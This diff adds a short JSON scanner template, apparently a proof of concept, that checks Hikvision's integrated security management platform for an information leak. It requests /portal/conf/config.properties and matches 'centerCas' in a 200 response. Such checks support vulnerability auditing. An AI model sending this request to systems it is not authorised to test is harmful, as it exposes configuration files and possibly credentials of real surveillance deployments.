@@ -1,0 +1,14 @@
+{
+	"name":"海康威视综合安防管理平台信息泄露",
+	"tag":"hikvision",
+	"type":"other",
+	"poc":{
+		"pocGet":"/portal/conf/config.properties",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(centerCas)"
+	}
+}
